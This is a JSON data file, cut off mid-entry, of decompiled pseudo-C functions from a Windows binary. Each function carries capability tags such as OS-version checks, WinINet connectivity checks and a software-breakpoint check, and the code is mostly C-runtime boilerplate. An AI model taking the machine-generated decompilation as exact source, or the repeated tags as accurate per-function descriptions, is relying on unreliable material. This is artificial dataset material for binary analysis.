{
    "00405734": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405734(uint *param_1)\n\n{\n    *param_1 = 0x401258;\n    if (param_1[2] != 0) {\n        fcn.004068fb(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "00404a9d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00404a9d(int32_t param_1, char param_2, int32_t param_3)\n\n{\n    uint arg_10h;\n    uint in_stack_fffffff0;\n    \n    if ((param_2 != '\\0') && (0xf < *(param_1 + 0x18))) {\n        arg_10h = *(param_1 + 4);\n        if (param_3 != 0) {\n            in_stack_fffffff0 = arg_10h;\n            fcn.004051a0(param_1 + 4, 0x10, arg_10h, param_3);\n        }\n        fcn.00404d4f(arg_10h, *(param_1 + 0x18) + 1);\n    }\n    *(param_1 + 0x18) = 0xf;\n    fcn.00404cb8(in_stack_fffffff0);\n    return;\n}\n",
        "token_count": 207
    },
    "00404cdf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __thiscall fcn.00404cdf(int32_t param_1, uint32_t param_2, uint param_3, uint param_4)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    char cVar2;\n    \n    uVar1 = fcn.00404ff8();\n    if (uVar1 < param_2) {\n        fcn.0040556c();\n    }\n    if (*(param_1 + 0x18) < param_2) {\n        fcn.00405008(param_2, *(param_1 + 0x14), unaff_EDI, unaff_ESI, unaff_retaddr, param_2, param_3, param_4);\n    }\n    else if ((cVar2 == '\\0') || (0xf < param_2)) {\n        if (param_2 == 0) {\n            fcn.00404cb8(0);\n        }\n    }\n    else {\n        uVar1 = *(param_1 + 0x14);\n        if (param_2 < *(param_1 + 0x14)) {\n            uVar1 = param_2;\n        }\n        fcn.00404a9d(1, uVar1);\n    }\n    return param_2 != 0;\n}\n",
        "token_count": 298
    },
    "00404d61": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.00404d61(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *extraout_ECX;\n    uint32_t uVar5;\n    int32_t extraout_EDX;\n    int32_t iVar6;\n    int32_t unaff_EBP;\n    uint32_t uVar7;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00410db4();\n    *(unaff_EBP + -0x10) = &var_18h;\n    uVar1 = fcn.00404b01();\n    *(unaff_EBP + -0x14) = uVar1;\n    iVar2 = fcn.00404b2d();\n    iVar3 = fcn.00404d5c();\n    if (iVar3 == iVar2) {\n        iVar3 = fcn.00404ecd();\n    }\n    uVar7 = iVar2 + 1;\n    if (*(unaff_EBP + -0x14) < uVar7) {\n        uVar5 = *(unaff_EBP + -0x14) >> 1;\n        if (iVar3 - uVar5 < *(unaff_EBP + -0x14)) {\n            *(unaff_EBP + -0x14) = 0;\n        }\n        else {\n            *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + uVar5;\n        }\n        if (*(unaff_EBP + -0x14) < uVar7) {\n            *(unaff_EBP + -0x14) = uVar7;\n        }\n        uVar1 = fcn.00404f34();\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x18) = uVar1;\n        fcn.00405215(*(extraout_EDX + 0xc), *(unaff_EBP + 0xc), uVar1);\n        uVar1 = fcn.00404bb8(extraout_ECX);\n        fcn.00405215(*(unaff_EBP + 0xc), *(extraout_EDX + 0x10), uVar1);\n        iVar2 = fcn.00404b2d();\n        if (*(extraout_EDX + 0xc) != 0) {\n            fcn.00404f27(*(extraout_EDX + 0xc));\n        }\n        iVar3 = *(unaff_EBP + -0x18);\n        *(extraout_EDX + 0x14) = iVar3 + *(unaff_EBP + -0x14) * 4;\n        *(extraout_EDX + 0x10) = iVar3 + (iVar2 + 1) * 4;\n        *(extraout_EDX + 0xc) = iVar3;\n    }\n    else {\n        iVar2 = *(extraout_EDX + 0x10);\n        iVar3 = *(unaff_EBP + 0xc);\n        if (iVar2 - iVar3 >> 2 == 0) {\n            *(unaff_EBP + -0x18) = *extraout_ECX;\n            fcn.00405215(iVar3, iVar2, iVar3 + 4);\n            iVar2 = unaff_EBP + -0x18;\n            fcn.00404bb8(iVar2);\n            *(extraout_EDX + 0x10) = *(extraout_EDX + 0x10) + 4;\n            iVar3 = unaff_EBP + -0x18;\n            iVar6 = *(extraout_EDX + 0x10) + -4;\n        }\n        else {\n            *(unaff_EBP + -0x18) = *extraout_ECX;\n            uVar4 = fcn.00405215(iVar2 + -4, iVar2, iVar2);\n            uVar1 = *(unaff_EBP + 0xc);\n            *(extraout_EDX + 0x10) = uVar4;\n            fcn.00405239(uVar1, iVar2 + -4, iVar2);\n            iVar2 = unaff_EBP + -0x18;\n            iVar6 = *(unaff_EBP + 0xc);\n            iVar3 = iVar6 + 4;\n        }\n        fcn.0040521a(iVar6, iVar3, iVar2);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 1047
    },
    "00404ff8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00404ff8(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00405156();\n    if (uVar1 < 2) {\n        return 1;\n    }\n    return uVar1 - 1;\n}\n",
        "token_count": 63
    },
    "00405008": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl\nfcn.00405008(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint arg_8h_00;\n    uint arg_10h;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint uVar4;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00410db4();\n    *(unaff_EBP + -0x10) = &var_18h;\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    uVar3 = *(unaff_EBP + 8) | 0xf;\n    uVar2 = fcn.00404ff8();\n    *(unaff_EBP + -0x1c) = uVar2;\n    if (uVar2 < uVar3) {\n        uVar3 = *(unaff_EBP + 8);\n    }\n    else {\n        uVar2 = *(extraout_ECX + 0x18);\n        *(unaff_EBP + -0x14) = uVar2;\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) >> 1;\n        uVar1 = *(unaff_EBP + -0x14);\n        if ((uVar3 / 3 < uVar1) && (uVar2 <= *(unaff_EBP + -0x1c) - uVar1)) {\n            uVar3 = uVar1 + uVar2;\n        }\n    }\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = fcn.0040514a(uVar3 + 1);\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0xc) != 0) {\n        uVar4 = *(unaff_EBP + 0xc);\n        arg_10h = fcn.00404d41();\n        fcn.004051a0(arg_8h_00, uVar3 + 1, arg_10h, uVar4);\n    }\n    fcn.00404a9d(1, 0);\n    uVar4 = *(unaff_EBP + 0xc);\n    *(extraout_ECX + 4) = arg_8h_00;\n    *(extraout_ECX + 0x18) = uVar3;\n    fcn.00404cb8(uVar4);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 714
    },
    "004052c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004052c8(uint32_t param_1)\n\n{\n    code *pcVar1;\n    uint var_ch;\n    \n    if (param_1 == 0) {\n        param_1 = 0;\n    }\n    else if (0xffffffff / param_1 == 0) {\n        fcn.00403120(0);\n        fcn.00405efb(&var_ch, 0x411438);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.00405c52(param_1);\n    return;\n}\n",
        "token_count": 133
    },
    "004054db": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004054db(int32_t param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    \n    while (param_1 != 0) {\n        param_1 = param_1 + -1;\n        *in_EAX = *param_2;\n        in_EAX = in_EAX + 1;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0040604b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040604b(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x4060f6;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.00406122;\n        uStack36 = *0x4121e0 ^ &fcn.0040604b::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0040604b::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.00406fe9();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.0040604b::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 724
    },
    "0040633b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040633b(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x4121e0) {\n        return;\n    }\n    *0x7fdd00 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x7fdd04 = &arg_8h;\n    *0x7fdc40 = 0x10001;\n    *0x7fdbe8 = 0xc0000409;\n    *0x7fdbec = 1;\n    var_328h = *0x4121e0;\n    var_324h = *0x4121e4;\n    *0x7fdbf4 = unaff_retaddr;\n    *0x7fdccc = in_GS;\n    *0x7fdcd0 = in_FS;\n    *0x7fdcd4 = in_ES;\n    *0x7fdcd8 = in_DS;\n    *0x7fdcdc = unaff_EDI;\n    *0x7fdce0 = unaff_ESI;\n    *0x7fdce4 = unaff_EBX;\n    *0x7fdce8 = in_EDX;\n    *0x7fdcec = in_ECX;\n    *0x7fdcf0 = in_EAX;\n    *0x7fdcf4 = unaff_EBP;\n    *0x7fdcf8 = unaff_retaddr;\n    *0x7fdcfc = in_CS;\n    *0x7fdd08 = in_SS;\n    *0x7fdc38 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040796c(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x401aac);\n    if (*0x7fdc38 == 0) {\n        fcn.0040796c(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 842
    },
    "004075b5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x004076a8: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x004076ad)\n// WARNING: Removing unreachable block (ram,0x004076db)\n// WARNING: Removing unreachable block (ram,0x004076b3)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004075b5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040777c(0x411060, 0x18);\n    fcn.00409d38(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x7fd6a8 != 1) {\n        *0x7fd6a4 = 1;\n        *0x7fd6a0 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00406d9d(*0x81452c);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00406d9d(*0x814528);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.00406d94();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00406d9d(*piVar2);\n                        iVar3 = fcn.00406d94();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00406d9d(*0x81452c);\n                        piVar1 = fcn.00406d9d(*0x814528);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.004074ef(0x4011b8);\n        }\n        fcn.004074ef(0x4011c0);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00409c5e(8);\n    }\n    return;\n}\n",
        "token_count": 805
    },
    "00408ca2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00408ca2(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040777c(0x4110c0, 0x10);\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    if (*(iVar1 + 4) < 0x81) {\n        iVar5 = *(iVar2 + 8);\n    }\n    else {\n        iVar5 = *(iVar2 + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar3 = fcn.00406fe9();\n    *(iVar3 + 0x90) = *(iVar3 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar1 + 4) <= iVar5)) {\n            fcn.004098af();\n        }\n        iVar3 = iVar5 * 8;\n        piVar4 = *(iVar1 + 8) + iVar3;\n        iVar5 = *piVar4;\n        *(unaff_EBP + -0x20) = iVar5;\n        *(unaff_EBP + -4) = 1;\n        if (piVar4[1] != 0) {\n            *(iVar2 + 8) = iVar5;\n            fcn.00409900(*(*(iVar1 + 8) + 4 + iVar3), iVar2, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar5;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00408d68();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.004098af();\n    }\n    *(iVar2 + 8) = iVar5;\n    fcn.004077c1();\n    return;\n}\n",
        "token_count": 565
    },
    "00408d68": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00408d68(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406fe9();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00406fe9();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "00409030": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409030(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.00406289(*(unaff_EBP + -0x28));\n    iVar1 = fcn.00406fe9();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.00406fe9();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.00406262(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00408dc8(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "0040c373": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040c373(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00409c5e(0);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "0040c805": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040c805(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00406d94();\n    var_4h = 0;\n    if (*0x7fe114 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x402344);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x402338);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x7fe114 = fcn.00406d22(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x402328);\n        *0x7fe118 = fcn.00406d22(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x402314);\n        *0x7fe11c = fcn.00406d22(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x4022f8);\n        *0x7fe124 = fcn.00406d22(uVar3);\n        if (*0x7fe124 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x4022e0);\n            *0x7fe120 = fcn.00406d22(uVar3);\n        }\n    }\n    if ((*0x7fe120 != iVar1) && (*0x7fe124 != iVar1)) {\n        pcVar4 = fcn.00406d9d(*0x7fe120);\n        pcVar5 = fcn.00406d9d(*0x7fe124);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040c947;\n        }\n    }\n    if ((((*0x7fe118 != iVar1) && (pcVar4 = fcn.00406d9d(*0x7fe118),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x7fe11c != iVar1 && (pcVar4 = fcn.00406d9d(*0x7fe11c),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040c947:\n    pcVar4 = fcn.00406d9d(*0x7fe114);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 835
    },
    "0040e49e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
